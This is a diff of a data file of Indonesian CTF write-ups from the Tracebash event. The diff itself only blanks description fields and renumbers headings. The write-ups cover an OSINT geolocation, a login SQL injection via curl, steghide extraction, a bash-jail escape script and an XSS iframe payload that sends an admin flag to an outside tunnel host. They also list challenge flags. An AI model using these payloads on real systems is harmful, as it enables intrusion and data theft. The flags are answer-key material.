@@ -321,7 +321,7 @@ export const tracebashWriteups: WriteUp[] = [
     "date": "2026-06-29",
     "author": "Nattt",
     "tags": [],
-    "description": "Flag: `TBCTF{br0_kn0w5_3v3ry_3nc0d1ng}`",
+    "description": "",
     "problemDescription": "Flag: `TBCTF{br0_kn0w5_3v3ry_3nc0d1ng}`",
     "tools": [],
     "analysis": "",
@@ -370,32 +370,32 @@ export const tracebashWriteups: WriteUp[] = [
         "code": "Screenshot chat\n→ profil Komoot\n→ Jim Lee\n→ handle jiml33t\n→ posting Threads tanggal 7 Mei 2026\n→ tulisan irigatii.ro\n→ Calea Buziașului, Timișoara\n→ Auchan Buziașului\n→ halte Piața Gheorghe Domășneanu"
       },
       {
-        "title": "2. Pivot dari Komoot ke identitas target",
+        "title": "Pivot dari Komoot ke identitas target",
         "content": "Profil Komoot tersebut menggunakan nama:\n\n\n\nDari profil dan jejak publik yang saling terhubung, ditemukan handle:\n\n\n\nHandle tersebut juga digunakan pada GitHub:\n\n\n\nBio akun GitHub mengandung informasi seperti:\n\n\n\nInformasi ini cocok dengan isi screenshot:\n\n- Target pernah aktif di dunia hacking.\n- Target sekarang lebih fokus pada aktivitas outdoor.\n- Deskripsi challenge menyebut seseorang yang meninggalkan hacking scene.\n\nKecocokan persona dan penggunaan handle yang sama membuat `jiml33t` menjadi kandidat target yang kuat.\n\nQuery yang dapat digunakan:\n\n\n\n---",
         "code": "Jim Lee"
       },
       {
-        "title": "3. Mencari aktivitas pada 7 Mei 2026",
+        "title": "Mencari aktivitas pada 7 Mei 2026",
         "content": "Challenge meminta lokasi target secara spesifik pada:\n\n\n\nDengan handle `jiml33t`, pencarian dilanjutkan ke platform sosial lain. Ditemukan akun Threads dengan handle yang sama.\n\nPada posting yang relevan tanggal 7 Mei 2026, target menyebut bahwa ia:\n\n1. Selesai melakukan aktivitas lari.\n2. Naik trem.\n3. Turun untuk menuju supermarket Prancis favoritnya.\n4. Ingin membeli atau meminum kopi.\n\nPosting tersebut juga menyertakan foto lingkungan sekitar. Pada salah satu bagian foto terlihat tulisan:\n\n\n\nDari sini terdapat dua kelompok petunjuk:\n\n- `irigatii.ro` digunakan untuk menentukan kota dan area.\n- “French supermarket” digunakan untuk menentukan tujuan target.\n\nQuery yang membantu:\n\n\n\n---",
         "code": "May 7, 2026"
       },
       {
-        "title": "4. Geolokasi melalui tulisan `irigatii.ro`",
+        "title": "Geolokasi melalui tulisan `irigatii.ro`",
         "content": "Tulisan `irigatii.ro` kemungkinan merupakan nama domain atau bisnis lokal. Pencarian terhadap domain tersebut mengarah ke sebuah lokasi di Romania.\n\nAlamat landmark tersebut berada di:\n\n\n\nDengan demikian, kota target dapat dipersempit menjadi:\n\n\n\nHal ini penting karena Timișoara memiliki jaringan trem yang aktif. Petunjuk target menaiki trem menjadi konsisten dengan kota tersebut.\n\nQuery yang dapat digunakan:\n\n\n\n---",
         "code": "Calea Buziașului 13\nTimișoara, Romania"
       },
       {
-        "title": "5. Mengidentifikasi “French supermarket”",
+        "title": "Mengidentifikasi “French supermarket”",
         "content": "Caption menyebut sebuah supermarket Prancis.\n\nSalah satu jaringan supermarket Prancis yang beroperasi di Romania adalah:\n\n\n\nDi area Calea Buziașului terdapat:\n\n\n\nAlamat tersebut sangat dekat dengan landmark `irigatii.ro` yang berada di nomor 13.\n\nKedekatan kedua alamat memperkuat kesimpulan bahwa supermarket yang dimaksud target adalah Auchan Buziașului.\n\n\n\nKarena target mengatakan turun dari trem sebelum menuju supermarket tersebut, halte yang dicari harus berada di sekitar kompleks Auchan atau area AEM.\n\nQuery:\n\n\n\n---",
         "code": "Auchan"
       },
       {
-        "title": "6. Menentukan halte trem",
+        "title": "Menentukan halte trem",
         "content": "Pencarian halte di sekitar Auchan Buziașului dan Calea Buziașului mengarah ke:\n\n\n\nNama tersebut muncul pada jaringan transportasi Timișoara. Pada beberapa rute, lokasinya juga diberi penjelas seperti:\n\n\n\natau dikaitkan dengan area:\n\n\n\nBagian dalam tanda kurung hanya berfungsi sebagai penjelas lokasi atau arah platform. Nama halte utamanya tetap:\n\n\n\nValidasi sebaiknya dilakukan menggunakan situs operator transportasi resmi Timișoara, yaitu SMTT, bukan hanya mengandalkan label peta atau blog pihak ketiga.\n\nQuery validasi:\n\n\n\n---",
         "code": "Piața Gheorghe Domășneanu"
       },
       {
-        "title": "7. Perbedaan ejaan nama halte",
+        "title": "Perbedaan ejaan nama halte",
         "content": "Beberapa sumber pihak ketiga menulis nama belakangnya sebagai:\n\n\n\nNamun, sumber transportasi resmi menggunakan:\n\n\n\nKarena flag challenge biasanya mengikuti nama resmi lokasi, versi dengan huruf `u` di akhir merupakan kandidat paling kuat.\n\nNama halte:\n\n\n\nSetelah spasi diganti underscore:\n\n\n\n---",
         "code": "Domășnean"
       },
@@ -676,23 +676,23 @@ export const tracebashWriteups: WriteUp[] = [
     "date": "2026-06-29",
     "author": "Nattt",
     "tags": [],
-    "description": "Challenge ini gabung dua hal: login SQL injection buat nyolong sesi admin, lalu stego di `favicon` yang dibuka pakai passphrase dari halaman admin.",
+    "description": "",
     "problemDescription": "Challenge ini gabung dua hal: login SQL injection buat nyolong sesi admin, lalu stego di `favicon` yang dibuka pakai passphrase dari halaman admin.",
     "tools": [],
     "analysis": "Halaman utama redirect ke `/login`. Setelah bikin akun biasa, surface yang kelihatan:\n\n- `/gallery`\n- `/profile`\n- `/admin_only`\n\nKomentar di `/admin_only` ngasih hint kalau ada password yang tersembunyi dan flag bukan ada langsung di halaman itu.",
     "solution": [
       {
-        "title": "2. Temu SQL injection di login",
+        "title": "Temu SQL injection di login",
         "content": "Payload ini bikin login lolos:\n\n\n\nKalau sesi hasil payload itu dipakai ke `/profile`, profil yang kebuka adalah user admin:\n\n\n\nOutput pentingnya:",
         "code": "curl -sk -c adminreal.txt -X POST https://web-madness.tracebash.xyz/login \\\n  --data-urlencode \"username=' OR username='admin' -- \" \\\n  --data-urlencode 'password=x' -i"
       },
       {
-        "title": "3. Ambil passphrase dari admin page",
+        "title": "Ambil passphrase dari admin page",
         "content": "Dengan sesi admin hasil SQLi, buka `/admin_only`:\n\n\n\nDi sana ada secret:\n\n\n\nHalaman yang sama juga bilang:\n\n\n\n`/robotsss.txt` cuma decoy, tapi hint \"uploaded by admins only\" ngedorong ke file gambar/stego.",
         "code": "curl -sk -b adminreal.txt https://web-madness.tracebash.xyz/admin_only"
       },
       {
-        "title": "4. Extract stego dari favicon",
+        "title": "Extract stego dari favicon",
         "content": "`/favicon.ico` ternyata bukan file ico, tapi JPEG. Passphrase dari admin page bisa dipakai buat extract data tersembunyi:\n\n\n\nOutput:",
         "code": "curl -sk https://web-madness.tracebash.xyz/favicon.ico -o fav.ico\nfile fav.ico\nsteghide extract -sf fav.ico -p 'M4dn3sS!' -xf stego_out\ncat stego_out"
       },
@@ -716,7 +716,7 @@ export const tracebashWriteups: WriteUp[] = [
     "date": "2026-06-29",
     "author": "Nattt",
     "tags": [],
-    "description": "Target: https://web-ping-me.tracebash.xyz/",
+    "description": "",
     "problemDescription": "Target: https://web-ping-me.tracebash.xyz/",
     "tools": [],
     "analysis": "",
@@ -810,12 +810,12 @@ export const tracebashWriteups: WriteUp[] = [
         "content": "Bug utamanya ada di `/view`. Input `rule` dimasukkan ke `innerHTML` setelah \"sanitasi\" regex yang cuma buang `<script>`, `javascript:`, dan atribut event handler. Itu masih bisa dibypass pakai `iframe srcdoc`, karena string di dalam `srcdoc` di-decode lagi jadi dokumen baru dan `<script>` di dalamnya tetap jalan.\n\nBot admin mengunjungi URL yang kita submit lewat `/report` selama host dan port cocok dengan `http://web:5000`. Endpoint `/report` sendiri me-rewrite `localhost` ke `web:5000`, jadi URL publik `http://localhost:5000/...` tetap diterima bot."
       },
       {
-        "title": "1. Siapkan endpoint penerima",
+        "title": "Siapkan endpoint penerima",
         "content": "Saya pakai HTTP server lokal dan reverse tunnel `localhost.run` supaya request dari bot bisa dicatat.\n\n\n\nMisal tunnel yang keluar:",
         "code": "python3 -m http.server 8003\nssh -R 80:localhost:8003 nokey@localhost.run"
       },
       {
-        "title": "2. Buat payload XSS",
+        "title": "Buat payload XSS",
         "content": "Payload final:\n\n\n\nURL yang dikirim ke `/report`:\n\n\n\nKirim dengan:",
         "code": "<iframe srcdoc=\"&lt;script&gt;fetch('/admin/flag').then(r=>r.text()).then(f=>top.location='https://8edc256df28737.lhr.life/'+encodeURIComponent(f))&lt;/script&gt;\"></iframe>"
       }
@@ -841,7 +841,7 @@ export const tracebashWriteups: WriteUp[] = [
     "solution": [
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport wave\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\n\r\n\r\nWAV_PATH = Path(\"melody.wav\")\r\nCIPHERTEXT_PATH = Path(\"ciphertext.bin\")\r\n\r\n\r\ndef extract_note_frequencies(path: Path) -> list[int]:\r\n    with wave.open(str(path), \"rb\") as wav_file:\r\n        sample_rate = wav_file.getframerate()\r\n        samples = np.frombuffer(\r\n            wav_file.readframes(wav_file.getnframes()), dtype=\"<i2\"\r\n        ).astype(np.float64)\r\n\r\n    seconds = len(samples) // sample_rate\r\n    frequencies = []\r\n    for second in range(seconds):\r\n        chunk = samples[second * sample_rate : (second + 1) * sample_rate]\r\n        windowed = chunk * np.hanning(len(chunk))\r\n        spectrum = np.fft.rfft(windowed)\r\n        freqs = np.fft.rfftfreq(len(windowed), d=1 / sample_rate)\r\n        spectrum[0] = 0\r\n        dominant = int(round(freqs[np.abs(spectrum).argmax()]))\r\n        frequencies.append(dominant)\r\n    return frequencies\r\n\r\n\r\ndef xor_repeating(data: bytes, key: bytes) -> bytes:\r\n    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))\r\n\r\n\r\ndef main() -> None:\r\n    ciphertext = CIPHERTEXT_PATH.read_bytes()\r\n    frequencies = extract_note_frequencies(WAV_PATH)\r\n    key = bytes(freq % 256 for freq in frequencies)\r\n    plaintext = xor_repeating(ciphertext, key)\r\n\r\n    print(\"frequencies:\", frequencies)\r\n    print(\"key_hex:\", key.hex())\r\n    print(plaintext.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -876,7 +876,7 @@ export const tracebashWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom pwn import remote\r\nimport re\r\n\r\nHOST = \"13.127.119.28\"\r\nPORT = 1337\r\n\r\n# Build \".\" from \"jail.sh\", then source the first 8-char glob match: flag.txt.\r\nPAYLOAD = b\": ???????;__=$_;__=${__#????};__=${__:$#:${##}};${__} ????????\"\r\n\r\n\r\ndef main() -> None:\r\n    r = remote(HOST, PORT)\r\n    r.recvuntil(b\"Nash> \")\r\n    r.sendline(PAYLOAD)\r\n    data = r.recvrepeat(2).decode(\"utf-8\", \"ignore\")\r\n    print(data, end=\"\")\r\n\r\n    match = re.search(r\"TBCTF\\{[^}]+\\}\", data)\r\n    if match:\r\n        print(match.group(0))\r\n\r\n    r.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -894,7 +894,7 @@ export const tracebashWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "Tracebash",
     "tags": [],
-    "description": "Target: https://web-ping-me.tracebash.xyz/",
+    "description": "",
     "problemDescription": "Target: https://web-ping-me.tracebash.xyz/",
     "tools": [],
     "analysis": "",
@@ -950,12 +950,12 @@ export const tracebashWriteups: WriteUp[] = [
         "content": "Bug utamanya ada di `/view`. Input `rule` dimasukkan ke `innerHTML` setelah \"sanitasi\" regex yang cuma buang `<script>`, `javascript:`, dan atribut event handler. Itu masih bisa dibypass pakai `iframe srcdoc`, karena string di dalam `srcdoc` di-decode lagi jadi dokumen baru dan `<script>` di dalamnya tetap jalan.\n\nBot admin mengunjungi URL yang kita submit lewat `/report` selama host dan port cocok dengan `http://web:5000`. Endpoint `/report` sendiri me-rewrite `localhost` ke `web:5000`, jadi URL publik `http://localhost:5000/...` tetap diterima bot."
       },
       {
-        "title": "1. Siapkan endpoint penerima",
+        "title": "Siapkan endpoint penerima",
         "content": "Saya pakai HTTP server lokal dan reverse tunnel `localhost.run` supaya request dari bot bisa dicatat.\n\n\n\nMisal tunnel yang keluar:",
         "code": "python3 -m http.server 8003\nssh -R 80:localhost:8003 nokey@localhost.run"
       },
       {
-        "title": "2. Buat payload XSS",
+        "title": "Buat payload XSS",
         "content": "Payload final:\n\n\n\nURL yang dikirim ke `/report`:\n\n\n\nKirim dengan:",
         "code": "<iframe srcdoc=\"&lt;script&gt;fetch('/admin/flag').then(r=>r.text()).then(f=>top.location='https://8edc256df28737.lhr.life/'+encodeURIComponent(f))&lt;/script&gt;\"></iframe>"
       }
